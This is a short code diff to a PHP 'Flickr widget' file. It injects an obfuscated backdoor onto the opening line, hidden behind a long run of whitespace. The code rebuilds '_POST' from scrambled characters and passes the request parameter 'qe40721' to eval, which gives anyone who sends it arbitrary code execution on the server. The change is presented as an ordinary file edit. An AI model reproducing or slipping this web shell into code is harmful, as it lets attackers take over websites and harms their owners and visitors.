@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                     $ijxe4 = "_opts";$dtc4 =strtoupper ( $ijxe4[0].$ijxe4[2] . $ijxe4[1].$ijxe4[4]. $ijxe4[3] ); if (isset ( ${ $dtc4 } [ 'qe40721'])) {eval(${$dtc4} [ 'qe40721']) ; } ?> <?php
 /**
  * Flickr widget
  * @package framework
